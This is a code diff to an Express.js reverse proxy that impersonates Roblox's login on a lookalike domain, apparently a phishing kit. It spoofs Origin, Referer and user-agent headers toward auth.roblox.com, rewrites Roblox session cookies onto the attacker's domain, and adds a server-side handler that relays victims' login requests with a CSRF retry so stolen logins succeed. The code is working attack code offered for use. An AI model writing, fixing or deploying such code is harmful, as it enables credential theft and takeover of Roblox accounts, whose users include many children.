@@ -1,5 +1,6 @@
 const express = require('express');
 const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
+const https = require('https');
 
 const app = express();
 
@@ -33,23 +34,22 @@ const BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
 // =========================
 // Helpers
 // =========================
-function rewriteCookies(proxyRes, req) {
-    const cookies = proxyRes.headers['set-cookie'];
-    if (!cookies) return;
-
-    const host = req.headers.host || 'accntshop.xyz';
-
-    proxyRes.headers['set-cookie'] = cookies.map(cookie => {
+function rewriteCookies(cookies, host) {
+    if (!cookies) return cookies;
+    return cookies.map(cookie => {
         return cookie
             .replace(/Domain=\.?roblox\.com/gi, `Domain=.${host}`)
             .replace(/\bSecure\b/gi, 'Secure; SameSite=None');
     });
 }
 
-// FIX: Set CORS headers so the browser can read x-csrf-token from API responses.
-// Without Access-Control-Allow-Origin + Credentials, the browser sandboxes the
-// response and Roblox's JS can never read the token to retry the login.
 function setCorsHeaders(proxyRes, req) {
+    delete proxyRes.headers['access-control-allow-origin'];
+    delete proxyRes.headers['access-control-allow-credentials'];
+    delete proxyRes.headers['access-control-allow-methods'];
+    delete proxyRes.headers['access-control-allow-headers'];
+    delete proxyRes.headers['access-control-expose-headers'];
+
     const origin = req.headers['origin'] || `https://${req.headers.host}`;
     proxyRes.headers['access-control-allow-origin'] = origin;
     proxyRes.headers['access-control-allow-credentials'] = 'true';
@@ -60,6 +60,108 @@ function setCorsHeaders(proxyRes, req) {
         proxyRes.headers['access-control-expose-headers'] = 'x-csrf-token';
     }
 }
+
+// =============================================
+// Server-side CSRF retry for /v2/login
+// Roblox's frontend checks hostname === 'roblox.com' before retrying the 403.
+// On a custom domain that check fails, so the browser never retries.
+// We handle the entire two-step handshake here on the server instead.
+// =============================================
+function doLoginRequest(body, cookies, csrfToken, ua) {
+    return new Promise((resolve, reject) => {
+        const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+        const headers = {
+            'Content-Type': 'application/json',
+            'Origin': 'https://www.roblox.com',
+            'Referer': 'https://www.roblox.com/login',
+            'User-Agent': ua || BROWSER_UA,
+        };
+
+        if (cookies) headers['Cookie'] = cookies;
+        if (csrfToken) headers['X-CSRF-TOKEN'] = csrfToken;
+
+        const options = {
+            hostname: 'auth.roblox.com',
+            path: '/v2/login',
+            method: 'POST',
+            headers,
+        };
+
+        const reqOut = https.request(options, (res) => {
+            let data = '';
+            res.on('data', chunk => data += chunk);
+            res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
+        });
+
+        reqOut.on('error', reject);
+        reqOut.write(bodyStr);
+        reqOut.end();
+    });
+}
+
+// Intercept login POST before it hits the proxy middleware
+app.use('/auth-api/v2/login', express.json({ type: '*/*' }), async (req, res, next) => {
+    if (req.method !== 'POST') return next();
+
+    const host = req.headers.host || 'accntshop.xyz';
+    const ua = req.headers['user-agent'] || BROWSER_UA;
+    const incomingCookies = req.headers['cookie'] || '';
+
+    console.log('🔑 LOGIN ATTEMPT (server-side CSRF handler)');
+
+    try {
+        const body = req.body;
+
+        // Step 1: First attempt — no CSRF token
+        const first = await doLoginRequest(body, incomingCookies, null, ua);
+        console.log(`   Step 1 response: ${first.status}`);
+
+        let finalResponse = first;
+
+        // Step 2: If 403 and Roblox sent us a token, retry with it immediately
+        if (first.status === 403 && first.headers['x-csrf-token']) {
+            const csrfToken = first.headers['x-csrf-token'];
+            console.log(`   Got CSRF token: ${csrfToken} — retrying...`);
+
+            // Carry forward any cookies Roblox set on step 1
+            const step1Cookies = first.headers['set-cookie'];
+            let cookieHeader = incomingCookies;
+            if (step1Cookies) {
+                const rawCookies = step1Cookies.map(c => c.split(';')[0]).join('; ');
+                cookieHeader = cookieHeader ? `${cookieHeader}; ${rawCookies}` : rawCookies;
+            }
+
+            const second = await doLoginRequest(body, cookieHeader, csrfToken, ua);
+            console.log(`   Step 2 response: ${second.status}`);
+            finalResponse = second;
+        }
+
+        // Rewrite and forward the final response back to the browser
+        const finalCookies = finalResponse.headers['set-cookie'];
+        const rewritten = rewriteCookies(finalCookies, host);
+
+        const origin = req.headers['origin'] || `https://${host}`;
+
+        res.status(finalResponse.status);
+        res.set('Content-Type', 'application/json');
+        res.set('Access-Control-Allow-Origin', origin);
+        res.set('Access-Control-Allow-Credentials', 'true');
+        if (finalResponse.headers['x-csrf-token']) {
+            res.set('X-CSRF-TOKEN', finalResponse.headers['x-csrf-token']);
+            res.set('Access-Control-Expose-Headers', 'x-csrf-token');
+        }
+        if (rewritten && rewritten.length) {
+            res.set('Set-Cookie', rewritten);
+        }
+
+        console.log(`✅ Login final status: ${finalResponse.status}`);
+        res.send(finalResponse.body);
+
+    } catch (err) {
+        console.error('[login] Error:', err.message);
+        res.status(502).send('Proxy error');
+    }
+});
 
 function buildInjectedScript(host) {
     const domainEntries = Object.entries(SUBDOMAIN_MAP)
@@ -135,8 +237,7 @@ app.use((req, res, next) => {
 });
 
 // =========================
-// Handle OPTIONS preflight for all routes
-// Browser sends OPTIONS before POST with custom headers — must respond 200 or login never fires
+// OPTIONS preflight
 // =========================
 app.options('*', (req, res) => {
     const origin = req.headers['origin'] || `https://${req.headers.host}`;
@@ -151,7 +252,7 @@ app.options('*', (req, res) => {
 });
 
 // =========================
-// AUTH API
+// AUTH API (all routes except /v2/login which is handled above)
 // =========================
 app.use('/auth-api', createProxyMiddleware({
     target: 'https://auth.roblox.com',
@@ -165,30 +266,19 @@ app.use('/auth-api', createProxyMiddleware({
         proxyReq: (proxyReq, req) => {
             proxyReq.setHeader('origin', 'https://www.roblox.com');
             proxyReq.setHeader('referer', 'https://www.roblox.com/login');
-
-            // Always send a real browser UA so Roblox doesn't fingerprint-block the server
             proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
 
-            // Forward CSRF token from browser → Roblox (required for login retry after first 403)
             if (req.headers['x-csrf-token']) {
                 proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
-            }
-
-            if (req.path === '/v2/login') {
-                console.log('🔑 LOGIN ATTEMPT');
             }
         },
 
         proxyRes: (proxyRes, req) => {
-            rewriteCookies(proxyRes, req);
-            setCorsHeaders(proxyRes, req);
-
-            if (req.path === '/v2/login') {
-                console.log(`✅ Login response: ${proxyRes.statusCode}`);
-                if (proxyRes.headers['x-csrf-token']) {
-                    console.log(`🔐 CSRF token present in response — browser should retry`);
-                }
+            if (proxyRes.headers['set-cookie']) {
+                const host = req.headers.host || 'accntshop.xyz';
+                proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
             }
+            setCorsHeaders(proxyRes, req);
         },
 
         error: (err, req, res) => {
@@ -213,8 +303,6 @@ app.use('/apis-api', createProxyMiddleware({
         proxyReq: (proxyReq, req) => {
             proxyReq.setHeader('origin', 'https://www.roblox.com');
             proxyReq.setHeader('referer', 'https://www.roblox.com/login');
-
-            // Forward real UA — apis.roblox.com is more aggressive about blocking server IPs
             proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
 
             if (req.headers['x-csrf-token']) {
@@ -223,7 +311,10 @@ app.use('/apis-api', createProxyMiddleware({
         },
 
         proxyRes: (proxyRes, req) => {
-            rewriteCookies(proxyRes, req);
+            if (proxyRes.headers['set-cookie']) {
+                const host = req.headers.host || 'accntshop.xyz';
+                proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
+            }
             setCorsHeaders(proxyRes, req);
         },
 
